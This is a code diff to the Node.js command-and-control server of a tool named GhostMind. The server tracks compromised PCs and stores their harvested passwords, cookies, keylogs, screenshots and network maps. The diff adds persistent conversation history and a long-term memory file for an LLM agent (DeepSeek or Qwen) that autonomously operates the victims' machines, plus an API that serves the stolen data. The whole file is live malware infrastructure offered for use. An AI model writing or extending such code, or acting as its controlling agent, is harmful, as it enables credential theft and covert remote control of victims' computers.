@@ -26,6 +26,7 @@ app.use(express.json({ limit: '50mb' })); // Naikkan had saiz JSON untuk screens
 
 // ── PERSISTENCE ──────────────────────────────────────────────
 const DATA_FILE = path.join(__dirname, 'ghost_data.json');
+const MEMORY_FILE = path.join(__dirname, 'ai_memory.json');
 
 function loadPersistedData() {
   try {
@@ -37,14 +38,38 @@ function loadPersistedData() {
   return null;
 }
 
+function loadMemoryData() {
+  try {
+    if (fs.existsSync(MEMORY_FILE)) {
+      const raw = fs.readFileSync(MEMORY_FILE, 'utf-8');
+      return JSON.parse(raw);
+    }
+  } catch (e) { console.log('[MEMORY] Failed to load:', e.message); }
+  return { facts: [], lessons: [], notes: [] };
+}
+
+function saveMemoryData(data) {
+  try {
+    fs.writeFileSync(MEMORY_FILE, JSON.stringify(data, null, 2));
+  } catch (e) { console.log('[MEMORY] Failed to save:', e.message); }
+}
+
 function savePersistedData() {
   try {
+    // Sync current histories to persistence
+    for (let sockId in agents) {
+      let ag = agents[sockId];
+      if (ag.pcName && ag.conversationHistory) {
+        persistedHistories[ag.pcName] = ag.conversationHistory.slice(-40);
+      }
+    }
     const data = {
       aiConfig,
       currentMode,
       harvestedCreds: allHarvestedCreds,
       capturedPasswords: allCapturedPasswords,
       logs: persistedLogs.slice(-200), // Keep last 200 log entries
+      persistedHistories,
       savedAt: new Date().toISOString()
     };
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
@@ -53,6 +78,8 @@ function savePersistedData() {
 
 // Load saved data on startup
 const savedData = loadPersistedData();
+let persistedHistories = savedData?.persistedHistories || {};
+let aiMemory = loadMemoryData();
 
 // State Tracking
 let agents = {};
@@ -74,6 +101,7 @@ let persistedLogs = savedData?.logs || [];
 
 // Auto-save every 30 seconds
 setInterval(savePersistedData, 30000);
+
 
 // API Endpoint to check status
 app.get('/api/status', (req, res) => {
@@ -113,7 +141,7 @@ app.get('/api/hybrid_command', (req, res) => {
   }
 });
 
-// Agent Data API: Credentials, keylog, network map
+// Agent Data API: Credentials, keylog, network map, chat history
 app.get('/api/agent-data/:type', (req, res) => {
   const { type } = req.params;
   
@@ -124,14 +152,31 @@ app.get('/api/agent-data/:type', (req, res) => {
     if (type === 'cookies') return res.json(ag.credentials.cookies.length > 0 ? ag.credentials.cookies : allHarvestedCreds.cookies);
     if (type === 'keylog') return res.json(ag.keylogBuffer);
     if (type === 'network') return res.json({ data: ag.networkMap });
+    if (type === 'ai_history') return res.json(ag.conversationHistory || []);
   } else {
     // Fall back to persisted data
     if (type === 'passwords') return res.json(allHarvestedCreds.passwords);
     if (type === 'cookies') return res.json(allHarvestedCreds.cookies);
     if (type === 'keylog') return res.json([]);
     if (type === 'network') return res.json({ data: null });
+    if (type === 'ai_history') return res.json([]);
   }
   res.json({ error: 'Unknown type' });
+});
+
+// Memory Database APIs
+app.get('/api/memory', (req, res) => {
+  res.json(aiMemory);
+});
+
+app.post('/api/memory', (req, res) => {
+  try {
+    aiMemory = req.body;
+    saveMemoryData(aiMemory);
+    res.json({ status: 'ok', memory: aiMemory });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // Persisted data API — dashboard loads this on startup
@@ -177,7 +222,7 @@ io.on('connection', (socket) => {
         lastScreenshot: null,
         visionContext: '',
         systemContext: payload.system_info || {},
-        conversationHistory: [], // Max 20 giliran
+        conversationHistory: persistedHistories[pcName] || [], // Persisted across reconnects/restarts
         credentials: { passwords: [], cookies: [] },
         keylogBuffer: [],
         networkMap: ''
@@ -394,10 +439,11 @@ io.on('connection', (socket) => {
       console.log(`[AI] User requested manual AI action: ${cmdString}`);
       io.emit('error_msg', `Asking AI: ${cmdString}...`);
       
-      // Bersihkan memori loop lama dan set misi semasa secara tegas
+      // Keep existing memory loop and active environment contexts (critical for multi-turn cognitive stability)
       if (activeAgentSocketId && agents[activeAgentSocketId]) {
-        agents[activeAgentSocketId].conversationHistory = [];
-        agents[activeAgentSocketId].visionContext = '';
+        if (!agents[activeAgentSocketId].conversationHistory) {
+          agents[activeAgentSocketId].conversationHistory = [];
+        }
       }
       aiConfig.customMission = cmdString;
       activeMissionPrompt = cmdString;  // PHASE 2: Track for DOM-triggered continuation
@@ -522,8 +568,9 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
     
     // Push manual command to history at the very start of the mission (stepsRemaining === 8)
     if (ag.conversationHistory && stepsRemaining === 8 && customPrompt) {
-      ag.conversationHistory = [];
+      // Append the custom manual command to current history instead of resetting it!
       ag.conversationHistory.push({ role: 'user', content: customPrompt });
+      if (ag.conversationHistory.length > 40) ag.conversationHistory.splice(0, 2); // Keep last 20 turns
     }
     const sysCtx = ag.systemContext || {};
     const systemContextStr = sysCtx.computer ? 
@@ -557,6 +604,22 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       missionInstruction = missionMap[aiConfig.skill] || missionMap.default;
     }
 
+    // Format long-term memory
+    const formatMemory = (mem) => {
+      let parts = [];
+      if (mem.facts && mem.facts.length > 0) {
+        parts.push(`Facts: ${mem.facts.map((f, i) => `[${i+1}] ${f}`).join(', ')}`);
+      }
+      if (mem.lessons && mem.lessons.length > 0) {
+        parts.push(`Lessons: ${mem.lessons.map((l, i) => `[${i+1}] ${l}`).join(', ')}`);
+      }
+      if (mem.notes && mem.notes.length > 0) {
+        parts.push(`Notes: ${mem.notes.map((n, i) => `[${i+1}] ${n}`).join(', ')}`);
+      }
+      return parts.length > 0 ? parts.join(' | ') : 'No long-term memories stored yet.';
+    };
+    const formattedMemory = formatMemory(aiMemory);
+
     // Build prompt using ai_brain.js module or fallback
     let promptText;
     if (aiBrain && aiBrain.buildPrompt) {
@@ -564,10 +627,11 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
         systemContext: systemContextStr,
         conversationHistory: historyStr,
         domContext: combinedContext ? combinedContext.substring(0, 4000) : 'No context available. Use pinchtab_navigate for web tasks or run for desktop apps.',
-        mission: missionInstruction
+        mission: missionInstruction,
+        longTermMemory: formattedMemory
       });
     } else {
-      promptText = `You are an autonomous agent. System: ${systemContextStr}. History: ${historyStr}. CONTEXT: ${combinedContext || 'none'}. Mission: ${missionInstruction}. Respond ONLY with valid JSON action.`;
+      promptText = `You are an autonomous agent. System: ${systemContextStr}. History: ${historyStr}. CONTEXT: ${combinedContext || 'none'}. Memory: ${formattedMemory}. Mission: ${missionInstruction}. Respond ONLY with valid JSON action.`;
     }
 
     // PHASE 3: Smart Routing — Browser Mode vs Desktop UIA Mode vs Vision Fallback
@@ -591,7 +655,7 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       const response = await ds.chat.completions.create({
         model: 'deepseek-chat',
         messages: [
-          { role: 'system', content: 'You are GhostMind, an autonomous computer control agent. Respond ONLY with valid JSON. No markdown, no explanation.' },
+          { role: 'system', content: 'You are GhostMind, an elite autonomous computer control agent. Every response MUST be a single JSON object containing a mandatory "thought" key where you perform step-by-step reasoning (Chain-of-Thought) in Malay/English, followed by the "action" key and parameters.' },
           { role: 'user', content: promptText }
         ],
         response_format: { type: 'json_object' },
@@ -604,7 +668,7 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       const response = await qwen.chat.completions.create({
         model: 'qwen-vl-plus',
         messages: [
-          { role: 'system', content: 'You are GhostMind, an autonomous agent. Respond ONLY with valid JSON.' },
+          { role: 'system', content: 'You are GhostMind, an elite autonomous computer control agent. Every response MUST be a single JSON object containing a mandatory "thought" key where you perform step-by-step reasoning (Chain-of-Thought) in Malay/English, followed by the "action" key and parameters.' },
           { role: 'user', content: [
             { type: 'text', text: promptText },
             { type: 'image_url', image_url: { url: `data:image/jpeg;base64,${imageBase64}` } }
@@ -635,9 +699,25 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       lastActionSignature = actionSig;
       // ════════════════════════════════════════════
 
+      // Log AI thought process to C2 console and broadcast to dashboard
+      if (parsed.thought) {
+        console.log(`[AI THOUGHT] 🧠 ${parsed.thought}`);
+        io.emit('error_msg', `🧠 Thought: ${parsed.thought}`);
+      }
+
       // Push assistant action to history
       if (ag.conversationHistory) {
-        ag.conversationHistory.push({ role: 'assistant', content: `action: ${parsed.action}${parsed.url ? ' → ' + parsed.url : ''}${parsed.command ? ' → ' + parsed.command : ''}${parsed.selector ? ' @ ' + parsed.selector : ''}` });
+        let contentStr = `action: ${parsed.action}`;
+        if (parsed.thought) {
+          // Store both thought and action in history so the AI has context of its own past reasoning
+          ag.conversationHistory.push({ role: 'assistant', content: `thought: ${parsed.thought}` });
+        }
+        if (parsed.action === 'memorize' && parsed.fact) {
+          contentStr += ` → memorize: "${parsed.fact}"`;
+        } else {
+          contentStr += `${parsed.url ? ' → ' + parsed.url : ''}${parsed.command ? ' → ' + parsed.command : ''}${parsed.selector ? ' @ ' + parsed.selector : ''}`;
+        }
+        ag.conversationHistory.push({ role: 'assistant', content: contentStr });
       }
 
       // Generate stateful system feedback
@@ -652,6 +732,8 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
         } else {
           systemFeedback = `[SYSTEM] Navigation executed. Screen view has changed. DOM context will be auto-fetched. Wait for next turn — fresh DOM with CSS selectors will appear in your context.`;
         }
+      } else if (parsed.action === 'memorize') {
+        systemFeedback = '[SYSTEM] Fact successfully saved to long-term memory.';
       } else if (parsed.action === 'nothing') {
         systemFeedback = '[SYSTEM] Mission complete.';
         activeMissionPrompt = null; // Clear mission
@@ -694,6 +776,45 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
         if (activeAgentSocketId) {
           io.to(activeAgentSocketId).emit('request_dom');
           io.emit('error_msg', 'AI requested DOM context. Fetching from Chrome...');
+        }
+      } else if (parsed.action === 'uia_get_ax_tree') {
+        // Request AX Tree from agent
+        if (activeAgentSocketId) {
+          shouldKeepBusy = false; // Release busy lock so context handler can re-acquire and continue
+          if (customPrompt && stepsRemaining > 0) {
+            activeMissionSteps = stepsRemaining - 1; // Decrement steps
+            activeMissionPrompt = customPrompt;
+          }
+          io.to(activeAgentSocketId).emit('request_ax_tree');
+          io.emit('error_msg', 'AI requested AX Tree context. Fetching from active window...');
+        }
+      } else if (parsed.action === 'memorize') {
+        // Store the fact in AI memory
+        const fact = parsed.fact || '';
+        if (fact.trim()) {
+          if (!aiMemory.facts) aiMemory.facts = [];
+          if (!aiMemory.facts.includes(fact)) {
+            aiMemory.facts.push(fact);
+            saveMemoryData(aiMemory);
+            io.emit('error_msg', `🧠 [MEMORY] AI auto-memorized: "${fact}"`);
+            console.log(`[MEMORY] AI auto-memorized: "${fact}"`);
+          }
+        }
+        
+        // Auto-continue the mission if steps remaining
+        if (customPrompt && stepsRemaining > 0) {
+          const nextStep = stepsRemaining - 1;
+          activeMissionSteps = nextStep;
+          activeMissionPrompt = customPrompt;
+          shouldKeepBusy = true;
+          setTimeout(async () => {
+            if (currentMissionId !== myMissionId) return;
+            let freshScreenshot = agents[activeAgentSocketId] ? agents[activeAgentSocketId].lastScreenshot : imageBase64;
+            io.emit('error_msg', `[AUTO] Continuing mission... (${nextStep} steps left)`);
+            await processAIScreenshot(freshScreenshot || imageBase64, customPrompt, nextStep);
+          }, 3000);
+        } else {
+          isAIBusy = false;
         }
       } else if (parsed.action && parsed.action !== 'nothing') {
         if (activeAgentSocketId && agents[activeAgentSocketId]) {
